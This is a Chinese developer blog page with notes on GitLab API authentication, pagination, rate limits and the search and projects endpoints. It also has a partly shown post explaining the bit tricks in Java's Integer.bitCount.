<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  

  
  <title>Vince Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Vince Blog">
<meta property="og:url" content="https://page.uetty.com/index.html">
<meta property="og:site_name" content="Vince Blog">
<meta property="og:locale" content="zh_CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Vince Blog">
  
    <link rel="alternate" href="/atom.xml" title="Vince Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>
</html>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Vince Blog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//www.baidu.com/s" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q1" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="q6" value="page.uetty.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-gitlab-api" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/08/gitlab-api/" class="article-date">
  <time datetime="2020-01-08T11:02:24.000Z" itemprop="datePublished">2020-01-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/08/gitlab-api/">Gitlab Api</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="认证-官网文档地址"><a href="#认证-官网文档地址" class="headerlink" title="认证(官网文档地址)"></a>认证(<a href="https://docs.gitlab.com/ee/api/README.html#authentication" target="_blank" rel="noopener">官网文档地址</a>)</h2><p>四种方式</p>
<ol>
<li>OAuth2 tokens</li>
<li>Personal access tokens</li>
<li>Session cookie</li>
<li>GitLab CI job token (Specific endpoints only)</li>
</ol>
<h3 id="OAuth2-tokens"><a href="#OAuth2-tokens" class="headerlink" title="OAuth2 tokens"></a>OAuth2 tokens</h3><p><code>curl https://gitlab.example.com/api/v4/projects?access_token=OAUTH-TOKEN</code></p>
<p>或</p>
<p><code>curl --header &quot;Authorization: Bearer OAUTH-TOKEN&quot; https://gitlab.example.com/api/v4/projects</code></p>
<h3 id="Personal-access-tokens"><a href="#Personal-access-tokens" class="headerlink" title="Personal access tokens"></a>Personal access tokens</h3><p><code>curl https://gitlab.example.com/api/v4/projects?private_token=&lt;your_access_token&gt;</code></p>
<p>或</p>
<p><code>curl --header &quot;Private-Token: &lt;your_access_token&gt;&quot; https://gitlab.example.com/api/v4/projects</code></p>
<p>或</p>
<p><code>curl --header &quot;Authorization: Bearer &lt;your_access_token&gt;&quot; https://gitlab.example.com/api/v4/projects</code></p>
<h2 id="响应状态码-官网文档地址"><a href="#响应状态码-官网文档地址" class="headerlink" title="响应状态码(官网文档地址)"></a>响应状态码(<a href="https://docs.gitlab.com/ee/api/README.html#status-codes" target="_blank" rel="noopener">官网文档地址</a>)</h2><p>成功的状态码主要会有三种，失败的情况有多种，具体官网文档查看</p>
<table>
<thead>
<tr>
<th align="left">状态码</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>200</code></td>
<td align="left">对于 <code>GET</code>, <code>PUT</code> or <code>DELETE</code> 请求，成功时返回的响应头中的状态码，并且返回的响应体包含json数据</td>
</tr>
<tr>
<td align="left"><code>201</code></td>
<td align="left">对于<code>POST</code>请求，成功时返回的响应头中的状态码，并且返回的响应体包含json数据</td>
</tr>
<tr>
<td align="left"><code>204</code></td>
<td align="left">表示服务器成功执行了请求，但返回的响应体无内容（即无响应体部分）</td>
</tr>
</tbody></table>
<h2 id="分页-官网文档地址"><a href="#分页-官网文档地址" class="headerlink" title="分页(官网文档地址)"></a>分页(<a href="https://docs.gitlab.com/ee/api/README.html#pagination" target="_blank" rel="noopener">官网文档地址</a>)</h2><p>提供两种分页方式</p>
<ol>
<li>键集分页（性能原因考虑，官网推荐这种方式）</li>
<li>偏移分页</li>
</ol>
<h3 id="偏移分页"><a href="#偏移分页" class="headerlink" title="偏移分页"></a>偏移分页</h3><p>请求参数控制分页</p>
<table>
<thead>
<tr>
<th align="left">参数名</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>page</code></td>
<td align="left">页码（默认1）</td>
</tr>
<tr>
<td align="left"><code>per_page</code></td>
<td align="left">每页数量（默认20，最大100）</td>
</tr>
</tbody></table>
<h3 id="键集分页"><a href="#键集分页" class="headerlink" title="键集分页"></a>键集分页</h3><p>键集分页可以更有效地检索页面，并且与基于偏移的分页不同，运行时与集合的大小无关（翻译自官网）。</p>
<p>请求参数控制分页</p>
<table>
<thead>
<tr>
<th align="left">参数名</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>pagination</code></td>
<td align="left"><code>keyset</code> (为了允许键集分页而设定)</td>
</tr>
<tr>
<td align="left"><code>per_page</code></td>
<td align="left">每页数量（默认20，最大100）</td>
</tr>
</tbody></table>
<p>例（<strong>官网文档案例</strong>）：</p>
<p>请求（官网文档上<code>--request PUT</code>应该是错的，实际请求应该去掉）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --request PUT --header &quot;PRIVATE-TOKEN: &lt;your_access_token&gt;&quot; &quot;https://gitlab.example.com/api/v4/projects?pagination=keyset&amp;per_page=50&amp;order_by=id&amp;sort=asc&quot;</span><br></pre></td></tr></table></figure>

<p>响应信息（<strong>官网文档案例</strong>中响应中包含到下一页的链接）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">...</span><br><span class="line">Link: &lt;https://gitlab.example.com/api/v4/projects?pagination=keyset&amp;per_page=50&amp;order_by=id&amp;sort=asc&amp;id_after=42&gt;; rel=&quot;next&quot;</span><br><span class="line">Status: 200 OK</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><strong>按官网文档介绍</strong>，下一页链接中包含额外的过滤器<code>id_after</code>，过滤器类型取决于<code>order_by</code>选项，当没有更多的记录时，响应头不包含<code>Link</code>字段。<code>rel=&quot;next&quot;</code>，并不是唯一的情况，还可能有<code>rel=&quot;first&quot;</code>、rel=”last”，<code>Link</code>字段中也可能同时存在多个<code>&lt;....&gt;; rel=&quot;...&quot;</code>，解码时需要注意。</p>
<p>仅对特定的资源支持键集分页(实际上应该不止这个接口)</p>
<table>
<thead>
<tr>
<th align="left">Resource</th>
<th align="left">Order</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><a href="https://docs.gitlab.com/ee/api/projects.html" target="_blank" rel="noopener">/api/v4/projects</a></td>
<td align="left"><code>order_by=id</code> only</td>
</tr>
</tbody></table>
<p><strong>实际验证之后发现</strong>，与文档描述是不一样的，响应头<code>Link</code>字段中的链接增加的参数不是<code>order_by</code>字段，而是<code>page=2</code>参数，以及增加了<code>/api/v4/projects</code>接口的其他参数，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">...</span><br><span class="line">Link: &lt;https://gitlab.com/api/v4/projects?membership=false&amp;order_by=id&amp;owned=false&amp;page=2&amp;pagination=keyset&amp;per_page=50&amp;repository_checksum_failed=false&amp;simple=false&amp;sort=asc&amp;starred=false&amp;statistics=false&amp;wiki_checksum_failed=false&amp;with_custom_attributes=false&amp;with_issues_enabled=false&amp;with_merge_requests_enabled=false&gt;; rel=&quot;next&quot;, &lt;https://gitlab.com/api/v4/projects?membership=false&amp;order_by=id&amp;owned=false&amp;page=1&amp;pagination=keyset&amp;per_page=50&amp;repository_checksum_failed=false&amp;simple=false&amp;sort=asc&amp;starred=false&amp;statistics=false&amp;wiki_checksum_failed=false&amp;with_custom_attributes=false&amp;with_issues_enabled=false&amp;with_merge_requests_enabled=false&gt;; rel=&quot;first&quot;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>可能是官网文档较长时间没更新了吧</p>
<h3 id="分页响应头"><a href="#分页响应头" class="headerlink" title="分页响应头"></a>分页响应头</h3><p>分页响应头中包含下面字段</p>
<table>
<thead>
<tr>
<th align="left">响应头</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>X-Total</code></td>
<td align="left">结果总数量（并不一定返回，官网介绍出于性能原因考虑结果集大于1000时就不会返回，实际上不返回的情况可能更多）</td>
</tr>
<tr>
<td align="left"><code>X-Total-Pages</code></td>
<td align="left">结果总页数（并不一定返回，官网介绍出于性能原因考虑结果集大于1000时就不会返回，实际上不返回的情况可能更多）</td>
</tr>
<tr>
<td align="left"><code>X-Per-Page</code></td>
<td align="left">每页多少条</td>
</tr>
<tr>
<td align="left"><code>X-Page</code></td>
<td align="left">当期所在页</td>
</tr>
<tr>
<td align="left"><code>X-Next-Page</code></td>
<td align="left">下一页</td>
</tr>
<tr>
<td align="left"><code>X-Prev-Page</code></td>
<td align="left">前一页</td>
</tr>
</tbody></table>
<p>分页这里还是有不少坑的，实际表现与官方文档描述诸多不符</p>
<p>键集分页响应头中另外还包含如下字段</p>
<table>
<thead>
<tr>
<th align="left">响应头</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>Link</code></td>
<td align="left">可能包含下一页的请求地址、上一页的请求地址、第一页的请求地址、最后一页的请求地址。仅仅是可能包含，不一定包含，比如，当结果总条数特别多时，就不会包含最后一页的请求地址（可能是性能原因考虑，gitlab服务器上实际上没有查询完所有结果就响应了）；当页面位于第一页时，不会包含上一页的请求地址。</td>
</tr>
</tbody></table>
<h2 id="频率限制-官网文档地址"><a href="#频率限制-官网文档地址" class="headerlink" title="频率限制(官网文档地址)"></a>频率限制(<a href="https://docs.gitlab.com/ee/security/rate_limits.html" target="_blank" rel="noopener">官网文档地址</a>)</h2><p>实际上频率限制这一块文档，基本是面向2B客户（即在自己服务器上部署gitlab的客户）的，API查询从官网文档中得不到多少信息。<code>Rack Attach</code>章节，可能会有些许借鉴意义，它旨在限制来自大量请求的IP地址的请求。</p>
<h3 id="Rack-Attach"><a href="#Rack-Attach" class="headerlink" title="Rack Attach"></a>Rack Attach</h3><p>API查询的请求头中返回的字段会包含如下几个(<a href="https://docs.gitlab.com/ee/user/gitlab_com/index.html#haproxy-api-throttle" target="_blank" rel="noopener">此处官网链接</a>)：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RateLimit-Limit: 600</span><br><span class="line">RateLimit-Observed: 6</span><br><span class="line">RateLimit-Remaining: 594</span><br><span class="line">RateLimit-Reset: 1563325137</span><br><span class="line">RateLimit-ResetTime: Wed, 17 Jul 2019 00:58:57 GMT</span><br></pre></td></tr></table></figure>

<p>其中<code>RateLimit-Remaining</code>表示到重置时间<code>RateLimit-Reset</code>为止，能进行多少次请求</p>
<p>对于某些受保护的接口，每分钟超过10次的情况下，会触发code <code>429</code>，并且响应头中会包含如下信息。表明当前IP被服务器限制请求，可在60秒后重新发起请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Retry-After: 60</span><br></pre></td></tr></table></figure>

<p>默认情况下，受保护的接口有</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">default[&apos;gitlab&apos;][&apos;gitlab-rails&apos;][&apos;rack_attack_protected_paths&apos;] = [</span><br><span class="line">  &apos;/users/password&apos;,</span><br><span class="line">  &apos;/users/sign_in&apos;,</span><br><span class="line">  &apos;/api/#&#123;API::API.version&#125;/session.json&apos;,</span><br><span class="line">  &apos;/api/#&#123;API::API.version&#125;/session&apos;,</span><br><span class="line">  &apos;/users&apos;,</span><br><span class="line">  &apos;/users/confirmation&apos;,</span><br><span class="line">  &apos;/unsubscribes/&apos;,</span><br><span class="line">  &apos;/import/github/personal_access_token&apos;,</span><br><span class="line">  &apos;/admin/session&apos;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h3 id="设置项目的请求频率"><a href="#设置项目的请求频率" class="headerlink" title="设置项目的请求频率"></a>设置项目的请求频率</h3><p>这一块与API请求无关，是2B客户设置请求频率相关的内容，可以在<a href="https://docs.gitlab.com/ee/user/admin_area/settings/user_and_ip_rate_limits.html" target="_blank" rel="noopener">User and IP rate limits</a>和<a href="https://docs.gitlab.com/ee/user/admin_area/settings/rate_limits_on_raw_endpoints.html" target="_blank" rel="noopener">Rate limits on raw endpoints</a>章节中查看</p>
<h2 id="查询相关接口官网文档地址"><a href="#查询相关接口官网文档地址" class="headerlink" title="查询相关接口官网文档地址"></a>查询相关接口<a href="https://docs.gitlab.com/ee/api/README.html#status-codes" target="_blank" rel="noopener">官网文档地址</a></h2><h3 id="search接口"><a href="#search接口" class="headerlink" title="search接口"></a>search接口</h3><p>全局（不限项目project/不限组织group）search接口路径</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/v4/search</span><br></pre></td></tr></table></figure>

<p>参数</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>scope</code></td>
<td align="left">搜索范围</td>
</tr>
<tr>
<td align="left"><code>search</code></td>
<td align="left">搜索的字符串</td>
</tr>
</tbody></table>
<p>scope取值</p>
<table>
<thead>
<tr>
<th align="left">取值</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">projects</td>
<td align="left">从项目名称和项目描述中搜索</td>
</tr>
<tr>
<td align="left">merge_requests</td>
<td align="left">从merge记录搜索</td>
</tr>
<tr>
<td align="left">issues</td>
<td align="left">从issue搜索</td>
</tr>
<tr>
<td align="left">milestones</td>
<td align="left">从发布的里程碑版本搜索</td>
</tr>
<tr>
<td align="left">snippet_titles</td>
<td align="left">从代码片（与项目没有关系，是另一种与项目同级别的产品）标题搜索</td>
</tr>
<tr>
<td align="left">snippet_blobs</td>
<td align="left">从代码片的内容搜索</td>
</tr>
<tr>
<td align="left">wiki_blobs</td>
<td align="left">从项目的文件内容搜索（在gitlab官方代码服务器上没法使用，需要在自己服务器部署gitlab服务器，并安装elasticsearch才能使用），在官网描述中看不出wiki_blobs与blobs有何区别</td>
</tr>
<tr>
<td align="left">commits</td>
<td align="left">从commit中搜索（在gitlab官方代码服务器上没法使用，需要在自己服务器部署gitlab服务器，并安装elasticsearch才能使用）</td>
</tr>
<tr>
<td align="left">blobs</td>
<td align="left">从项目的文件内容搜索（在gitlab官方代码服务器上没法使用，需要在自己服务器部署gitlab服务器，并安装elasticsearch才能使用）</td>
</tr>
<tr>
<td align="left">users</td>
<td align="left">从用户名搜索</td>
</tr>
</tbody></table>
<h3 id="projects接口"><a href="#projects接口" class="headerlink" title="projects接口"></a>projects接口</h3><p>接口路径</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/v4/projects</span><br></pre></td></tr></table></figure>

<p>参数</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">类型</th>
<th align="left">是否必传</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>archived</code></td>
<td align="left">boolean</td>
<td align="left">no</td>
<td align="left">过滤打包状态</td>
</tr>
<tr>
<td align="left"><code>visibility</code></td>
<td align="left">string</td>
<td align="left">no</td>
<td align="left">过滤可见范围 <code>public</code>, <code>internal</code>, <code>private</code></td>
</tr>
<tr>
<td align="left"><code>order_by</code></td>
<td align="left">string</td>
<td align="left">no</td>
<td align="left">排序依据字段，可以为<code>id</code>, <code>name</code>, <code>path</code>, <code>created_at</code>, <code>updated_at</code>, <code>last_activity_at</code> 字段，默认是 <code>created_at</code></td>
</tr>
<tr>
<td align="left"><code>sort</code></td>
<td align="left">string</td>
<td align="left">no</td>
<td align="left">排序，<code>asc</code> / <code>desc</code> ，默认是 <code>desc</code></td>
</tr>
<tr>
<td align="left"><code>search</code></td>
<td align="left">string</td>
<td align="left">no</td>
<td align="left">搜索字符串</td>
</tr>
<tr>
<td align="left"><code>simple</code></td>
<td align="left">boolean</td>
<td align="left">no</td>
<td align="left">true时，只返回少量简单字段</td>
</tr>
<tr>
<td align="left"><code>owned</code></td>
<td align="left">boolean</td>
<td align="left">no</td>
<td align="left">过滤，仅当前用户拥有的项目</td>
</tr>
<tr>
<td align="left"><code>membership</code></td>
<td align="left">boolean</td>
<td align="left">no</td>
<td align="left">过滤，仅当前用户所属的项目</td>
</tr>
<tr>
<td align="left"><code>starred</code></td>
<td align="left">boolean</td>
<td align="left">no</td>
<td align="left">过滤，仅当前用户加星的项目</td>
</tr>
<tr>
<td align="left"><code>statistics</code></td>
<td align="left">boolean</td>
<td align="left">no</td>
<td align="left">包括项目统计</td>
</tr>
<tr>
<td align="left"><code>with_custom_attributes</code></td>
<td align="left">boolean</td>
<td align="left">no</td>
<td align="left">过滤，包含<a href="https://docs.gitlab.com/ee/api/custom_attributes.html" target="_blank" rel="noopener">自定义属性 custom_attributes</a>设置（仅管理员）</td>
</tr>
<tr>
<td align="left"><code>with_issues_enabled</code></td>
<td align="left">boolean</td>
<td align="left">no</td>
<td align="left">过滤，根据issues_enabled值</td>
</tr>
<tr>
<td align="left"><code>with_merge_requests_enabled</code></td>
<td align="left">boolean</td>
<td align="left">no</td>
<td align="left">过滤，根据merge_requests_enabled值</td>
</tr>
<tr>
<td align="left"><code>with_programming_language</code></td>
<td align="left">string</td>
<td align="left">no</td>
<td align="left">过滤，按编程语言过滤</td>
</tr>
<tr>
<td align="left"><code>wiki_checksum_failed</code></td>
<td align="left">boolean</td>
<td align="left">no</td>
<td align="left">wiki校验值计算失败的项目(<a href="https://about.gitlab.com/pricing/" target="_blank" rel="noopener">GitLab Premium</a> 11.2中的<a href="https://gitlab.com/gitlab-org/gitlab/merge_requests/6137" target="_blank" rel="noopener">介绍</a>)</td>
</tr>
<tr>
<td align="left"><code>repository_checksum_failed</code></td>
<td align="left">boolean</td>
<td align="left">no</td>
<td align="left">repository校验值计算失败的项目(<a href="https://about.gitlab.com/pricing/" target="_blank" rel="noopener">GitLab Premium</a> 11.2中的<a href="https://gitlab.com/gitlab-org/gitlab/merge_requests/6137" target="_blank" rel="noopener">介绍</a>)</td>
</tr>
<tr>
<td align="left"><code>min_access_level</code></td>
<td align="left">integer</td>
<td align="left">no</td>
<td align="left">过滤，仅当前用户的 <a href="https://docs.gitlab.com/ee/api/members.html" target="_blank" rel="noopener">最低访问权限级别</a></td>
</tr>
<tr>
<td align="left"><code>id_after</code></td>
<td align="left">integer</td>
<td align="left">no</td>
<td align="left">过滤，限制为ID大于指定ID的项目</td>
</tr>
<tr>
<td align="left"><code>id_before</code></td>
<td align="left">integer</td>
<td align="left">no</td>
<td align="left">过滤，限制为ID小于指定ID的项目</td>
</tr>
</tbody></table>
<p>返回值中有两个需要注意的参数<code>repository_access_level</code>和<code>visibility</code>，只有<code>repository_access_level</code>参数值为<code>enabled</code>且<code>visibility</code>参数值为<code>public</code>时才可以clone该仓库</p>
<p>该接口，经身份验证的用户和未经身份验证的用户均可使用，但未经身份验证的用户响应内容中的信息会更少，与<code>simple=true</code>的时候相同。</p>
<p>当请求中包含自定义属性时，请求url传参如下所示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api/v4/projects?custom_attributes[key]=value&amp;custom_attributes[other_key]=other_value</span><br></pre></td></tr></table></figure>

<p>阅读文档后，没怎么弄懂上面<code>/api/v4/projects</code>和<code>/api/v4/search?scope=projects</code>这两个接口有什么重要的区别，姑且认为它们是可以相互取代的，使用任意一个皆可。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://page.uetty.com/2020/01/08/gitlab-api/" data-id="ck5qhi075002pg0uks9hqbyjk" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/api/">api</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-source-bitcount" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/12/11/source-bitcount/" class="article-date">
  <time datetime="2019-12-11T11:11:49.000Z" itemprop="datePublished">2019-12-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/11/source-bitcount/">JDK中Integer.bitCount解析</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>使用过Redis的人可能知道，Redis中给我们提供了统计二进制位数为1的位数量的指令<code>bitcout</code>，JDK中Integer类同样也给我们提供了该功能的方法<code>Integer.bigCount</code>，得益于此，我们很容易就能一窥该方法的实现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public static int bitCount(int i) &#123;</span><br><span class="line">    // HD, Figure 5-2</span><br><span class="line">    i = i - ((i &gt;&gt;&gt; 1) &amp; 0x55555555);</span><br><span class="line">    i = (i &amp; 0x33333333) + ((i &gt;&gt;&gt; 2) &amp; 0x33333333);</span><br><span class="line">    i = (i + (i &gt;&gt;&gt; 4)) &amp; 0x0f0f0f0f;</span><br><span class="line">    i = i + (i &gt;&gt;&gt; 8);</span><br><span class="line">    i = i + (i &gt;&gt;&gt; 16);</span><br><span class="line">    return i &amp; 0x3f;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述代码作为Integer类中比较有意思的一个方法，该方法利用了一个技巧：通过分割分配二进制位的方式，CPU可以实现一个指令同时计算多个数值。该方法的前四行都利用了该技巧。</p>
<p>NOTE：CPU要通过分配字节位的方式同时计算多个数值对，需要有一定的前提：由于每个数分配的字节位的长度有限，这就要求计算结果的二进制表示不能超出分配的位数。在当前问题上，显而易见是成立的：相加的两个数的最大值所占的二进制位数只有分配的二进制位的一半，结果值需要的二进制位必然不会超过分配的二进制位数。</p>
<h2 id="案例解析"><a href="#案例解析" class="headerlink" title="案例解析"></a>案例解析</h2><p>为了利于问题的解决，对计算二进制位1的数量这个问题，做一个等价转换：计算二进制位上每一位值的和。</p>
<p>以数字<code>‭1823425321‬</code>为例，二进制数值为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‭0 1 1 0  1 1 0 0  1 0 1 0  1 1 1 1  0 1 0 0  0 0 1 1  0 0 1 0  1 0 0 1‬</span><br></pre></td></tr></table></figure>

<p><strong>1. 方法第一行</strong></p>
<p>将二进制的每1位都视为一个单独的数字，从左往右两个两个数字配对，形成16组二进制数相加，得到16个数值（2位二进制）。为了使结果是2位二进制数，相加前还需先给每个数前面补零。计算过程如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">‭0 1  1 0  1 1  0 0  1 0  1 0  1 1  1 1  0 1  0 0  0 0  1 1  0 0  1 0  1 0  0 1‬     </span><br><span class="line">                                      ⇩  </span><br><span class="line">00   01   01   00   01   01   01   01   00   00   00   01   00   01   01   00</span><br><span class="line">                                      +</span><br><span class="line">01   00   01   00   00   00   01   01   01   00   00   01   00   00   00   01</span><br><span class="line">                                      ⇩</span><br><span class="line">01   01   10   00   01   01   10   10   01   00   00   10   00   01   01   01</span><br></pre></td></tr></table></figure>

<p>上述计算过程用代码表示如下（0x55555555的二进制值是0b_01010101010101010101010101010101）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i = (i &amp; 0x55555555) + ((i &gt;&gt;&gt; 1) &amp; 0x55555555);</span><br></pre></td></tr></table></figure>

<p>公式中，<code>i &gt;&gt;&gt; 1</code>将偶数位变为了奇数位，<code>&amp; 0x55555555</code>则清空偶数位，结合起来之后<code>(i &amp; 0x55555555)</code>和<code>((i &gt;&gt;&gt; 1) &amp; 0x55555555)</code>就分别提取了奇数位和偶数位的值，分别以奇偶位为基构建了两组2位二进制数数组，两组数组相加，完成第1步计算。</p>
<p>认真的可能就会发现，不对啊，代码里分明是减法啊。实际上，第一行代码，用了另一个公式替代：对于2位二进制数n，1的个数c可用公式<code>c = n - (n &gt;&gt;&gt; 1)</code>计算得到。这个公式也很容易证明：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">假设：2位二进制n = b1 * (2 ^ 1) + b0 * (2 ^ 0)，显然b1是n的第2位数，b0是n的第1位数</span><br><span class="line">那么：所证问题等价于证明 b1 + b0 = n - b1</span><br><span class="line">因为</span><br><span class="line">    n - b1 = b1 * (2 ^ 1) + b0 * (2 ^ 0) - b1</span><br><span class="line">           = b1 * 2 + b0 - b1</span><br><span class="line">           = b1 + b0</span><br><span class="line">所以问题得证</span><br></pre></td></tr></table></figure>

<p>新的公式的代码在计算指令上比旧的代码减少了一个指令。所以新的代码就变为了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i = i - ((i &gt;&gt;&gt; 1) &amp; 0x55555555);</span><br></pre></td></tr></table></figure>

<p><strong>2. 方法第二行</strong></p>
<p>将二进制数每2位视为一个单独的数字，从左往右两个两个数字配对，形成8组二进制数相加，得到8个数值（4位二进制）。同样的，为了使结果是4位二进制数，相加前还得给每个数前面补零。计算过程如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">01  01    10  00    01  01    10  10    01  00    00  10    00  01    01   01</span><br><span class="line">                                     ⇩  </span><br><span class="line">0001      0010      0001      0010      0001      0000      0000      0001</span><br><span class="line">                                     +</span><br><span class="line">0001      0000      0001      0010      0000      0010      0001      0001</span><br><span class="line">                                     ⇩</span><br><span class="line">0010      0010      0010      0100      0001      0010      0001      0010</span><br></pre></td></tr></table></figure>

<p>上述计算过程用代码表示如下（0x33333333的二进制值是0b_0011001100110011001100110011‬0011）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i = (i &amp; 0x33333333) + ((i &gt;&gt;&gt; 2) &amp; 0x33333333);</span><br></pre></td></tr></table></figure>

<p>同样的，公式中，通过<code>(i&gt;&gt;&gt;2) &amp; 0x33333333</code>和<code>i &amp; 0x33333333</code>将<code>i</code>分为了相加的两部分，<code>0x33333333</code>起到了清空高2位数据的作用</p>
<p><strong>3. 方法第三行</strong></p>
<p>将二进制数的每4位视为一个单独的数字，从左往右两个两个数字配对，形成4组二进制数相加，得到4个数值（8位二进制）。同上所述，前面补零。计算过程如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0010   0010   0010   0100   0001   0010   0001   0010</span><br><span class="line">                          ⇩</span><br><span class="line">00000010      00000010      00000001      00000001</span><br><span class="line">                          +</span><br><span class="line">00000010      00000100      00000010      00000010</span><br><span class="line">                          ⇩</span><br><span class="line">00000100      00000110      00000011      00000011</span><br></pre></td></tr></table></figure>

<p>上述计算过程用代码表示如下（0x0f0f0f0f的二进制值是0b_00001111000011110000111100001111‬）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i = (i &amp; 0x0f0f0f0f) + ((i &gt;&gt;&gt; 4) &amp; 0x0f0f0f0f);</span><br></pre></td></tr></table></figure>

